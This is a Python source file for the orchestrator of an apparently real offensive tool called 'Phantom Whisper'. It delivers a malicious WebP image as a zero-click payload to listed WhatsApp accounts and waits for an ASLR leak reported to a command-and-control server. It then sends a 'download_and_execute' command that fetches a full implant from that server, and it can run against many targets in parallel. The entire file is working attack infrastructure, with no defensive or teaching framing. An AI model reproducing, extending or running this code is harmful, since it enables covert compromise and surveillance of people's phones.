# phantom_whisper/orchestrator.py
import time
import sys
import secrets
# --- REMOVED UNUSED IMPORTS (Path, Dict, Any) ---
from typing import List, TYPE_CHECKING # Removed Optional as it is no longer used
import logging # RE-ADDED: for logging.LoggerAdapter

# For concurrency in the future
if TYPE_CHECKING: # Guards the import for type checking purposes only
    from concurrent.futures import ThreadPoolExecutor

# Import from our new, well-structured modules
from .config import settings 
# --- REMOVED UNUSED IMPORTS FROM EXCEPTIONS ---
from .c2_client import C2Client # C2Client imported here for instantiation
from .whatsapp_transport import WhatsAppTransport
from .exceptions import (
    # --- REMOVED UNUSED IMPORTS FROM EXCEPTIONS ---
    C2Error, PayloadError, WhatsAppTransportError,
    LeakTimeoutError, CommandDispatchError 
)

# --- CORRECTED GLOBAL LOGGER CONFIGURATION ---
# Now uses get_logger from .logger module to ensure it's properly configured
from .logger import get_logger 
global_logger = get_logger(__name__)

class PhantomWhisperOrchestrator:
    """
    Orchestrates the multi-stage Phantom Whisper attack against target(s).
    Encapsulates the core attack logic and manages state.
    """
    def __init__(
        self,
        target_ids: List[str],
        malicious_webp_payload: bytes,
        # Clients (C2, WhatsAppTransport) are no longer passed here
        # They are instantiated per target to ensure explicit thread safety
    ):
        self.attack_session_id = secrets.token_hex(8)
        self.target_ids = target_ids
        self.malicious_webp_payload = malicious_webp_payload
        
        # Calculate payload_hash before building logger adapter so it's available in context
        self.payload_hash = self._calculate_payload_hash(malicious_webp_payload)
        
        # Base logger for this orchestrator instance's context
        self.logger = logging.LoggerAdapter(global_logger, {'session_id': self.attack_session_id, 'payload_hash': self.payload_hash})

        self.logger.info(f"Initialized Phantom Whisper Orchestrator.")

    def _calculate_payload_hash(self, payload: bytes) -> str:
        """Calculates SHA256 hash of the payload for integrity checking."""
        import hashlib
        try:
            # Handle both TypeError (older Python) and ValueError (non-FIPS enabled builds)
            return hashlib.sha256(payload, usedforsecurity=True).hexdigest() 
        except (TypeError, ValueError): # Catch both TypeError (older Python) and ValueError (non-FIPS builds)
            # Use self.logger which is guaranteed to be configured after __init__ logic
            # This addresses the previous potential crash/silent log
            self.logger.debug("usedforsecurity flag not supported or caused an error, falling back to standard sha256.", extra={"payload_size": len(payload)})
            return hashlib.sha256(payload).hexdigest() 


    def _wait_for_aslr_leak(self, target_id: str, c2_client_instance: C2Client) -> str: # Signature fixed to str
        """
        Continuously queries C2 for ASLR leak data for a given target with exponential backoff.
        Accepts c2_client_instance for thread safety when called from _attack_single_target.
        """
        initial_wait = settings.aslr_wait_time
        retries = settings.aslr_max_retries
        max_wait = settings.aslr_max_wait_time

        for attempt in range(retries):
            try:
                # Use the passed c2_client_instance for query
                aslr_leak_address = c2_client_instance.query_leak_data(target_id)
                if aslr_leak_address:
                    return aslr_leak_address
            except C2Error as e: 
                self.logger.warning(f"Error querying C2 for ASLR leak: {e}",
                               extra={"target_id": target_id, "attempt": attempt + 1})

            if attempt < retries - 1:
                wait_time = min(initial_wait * (2 ** attempt), max_wait) 
                self.logger.info(f"ASLR leak not yet received. Retrying in {wait_time}s (Attempt {attempt+1}/{retries})...",
                            extra={"target_id": target_id, "wait_time": wait_time, "attempt_num": attempt + 1})
                time.sleep(wait_time)
        
        raise LeakTimeoutError(f"Failed to obtain ASLR leak for {target_id} after {retries} attempts.")
    
    def _attack_single_target(self, target_id: str) -> bool:
        """Encapsulates the full attack flow for a single target."""
        # Instantiate clients *per target* to ensure thread safety
        # Each C2Client will have its own requests.Session
        c2_client = C2Client(
            base_url=settings.c2_server_base_url, 
            api_key=settings.c2_api_key_str # Use the string key instance
        )
        # WhatsAppTransport also instantiated per target, passing its specific logger context
        target_logger_adapter = logging.LoggerAdapter(self.logger, {'target_id': target_id})
        whatsapp_transport = WhatsAppTransport(target_logger_adapter)

        target_logger_adapter.info(f"Initiating attack against {target_id}")

        try:
            # Stage 1: Deliver initial zero-click payload (malicious WebP)
            target_logger_adapter.info("Delivering malicious WebP payload...")
            whatsapp_transport.send_media(target_id, self.malicious_webp_payload)
            target_logger_adapter.info("Initial payload delivered. Waiting for ASLR leak...") 

            # Stage 2: Wait for and retrieve ASLR leak from C2
            # Pass the c2_client instance created for this target
            aslr_leak_address = self._wait_for_aslr_leak(target_id, c2_client) 
            
            target_logger_adapter.info(f"Successfully obtained ASLR leak. Target is compromised (Stage 1).",
                        extra={"leak_address": aslr_leak_address})

            # Stage 3: Send second-stage command via C2
            target_logger_adapter.info("Sending second-stage command to download full implant...")
            
            implant_filename = f"main_implant_{settings.OS_TYPE.value}.bin" 
            implant_url = f"{settings.c2_server_base_url}/implants/{implant_filename}"
            
            # Use the c2_client instance for this target
            if c2_client.send_command(target_id, "download_and_execute", {"url": implant_url}):
                target_logger_adapter.info("Full implant download command sent. Awaiting execution confirmation.",
                            extra={"implant_url": implant_url})
            else:
                raise CommandDispatchError("Failed to send full implant download command to C2.")

            target_logger_adapter.info(f"Attack orchestration complete. Monitor C2 for further activity.",
                        extra={"status": "COMPLETE"})
            
            return True # Indicates success for this target

        except (LeakTimeoutError, CommandDispatchError, WhatsAppTransportError, PayloadError) as e:
            target_logger_adapter.error(f"Attack failed - Orchestration Error: {e}")
        except C2Error as e: 
            target_logger_adapter.error(f"Attack failed - C2 Communication Error: {e}")
        except Exception as e: 
            target_logger_adapter.critical(f"An unhandled critical error occurred during orchestration: {e}",
                            exc_info=True)
        finally:
            target_logger_adapter.info(f"Finished processing target.", extra={"status_for_target_processed": "finished"})
        return False # Indicates failure for this target


    def orchestrate(self) -> int: # Returns number of failed targets
        """
        Main orchestration loop. Iterates through targets and attacks them.
        Can be used with ThreadPoolExecutor for parallelism.
        """
        self.logger.info("Starting Phantom Whisper attack orchestration.",
                    extra={"target_count": len(self.target_ids)})

        failed_targets_count = 0

        # Option for sequential processing (default)
        for target_id in self.target_ids:
            if not self._attack_single_target(target_id):
                failed_targets_count += 1
        
        # Option for parallel processing (uncomment and adjust as needed)
        # from concurrent.futures import ThreadPoolExecutor # Moved import here
        # with ThreadPoolExecutor(max_workers=settings.max_workers) as executor: # Add max_workers to config
        #     results = executor.map(self._attack_single_target, self.target_ids)
        #     for success in results:
        #         if not success:
        #             failed_targets_count += 1

        self.logger.info(f"All targets processed for Phantom Whisper attack. Failed {failed_targets_count} targets.",
                    extra={"failed_targets_count": failed_targets_count})
        return failed_targets_count


def _load_malicious_webp_payload_from_config() -> bytes:
    """Helper function to load the payload, handles potential PayloadError."""
    try:
        # Path also removed from orchestrator imports block
        return settings.malicious_webp_path.read_bytes()
    except FileNotFoundError:
        raise PayloadError(f"Malicious WebP payload not found at: {settings.malicious_webp_path}")
    except Exception as e:
        raise PayloadError(f"Error loading malicious WebP payload: {e}")

def main():
    """Main entry point for the Phantom Whisper Orchestrator."""
    failed_targets_count = 0
    try:
        # Load the payload once at startup. This ensures consistency.
        mal_webp_payload = _load_malicious_webp_payload_from_config()

        # Orchestrator no longer takes clients as arguments
        # Clients are instantiated per-target inside _attack_single_target
        orchestrator = PhantomWhisperOrchestrator(
            target_ids=settings.target_whatsapp_ids,
            malicious_webp_payload=mal_webp_payload,
        )
        failed_targets_count = orchestrator.orchestrate()

        global_logger.info("Orchestration process finished successfully.")
    except PayloadError as e:
        global_logger.critical(f"Failed to initialize orchestrator due to payload issue: {e}")
        failed_targets_count = len(settings.target_whatsapp_ids) 
    except Exception as e: 
        global_logger.critical(f"An unexpected critical error occurred during main execution: {e}", exc_info=True)
        # Assuming any unhandled exception here means all targets failed from an orchestration perspective
        failed_targets_count = len(settings.target_whatsapp_ids) 
    finally:
        sys.exit(failed_targets_count) 


if __name__ == "__main__":
    main()
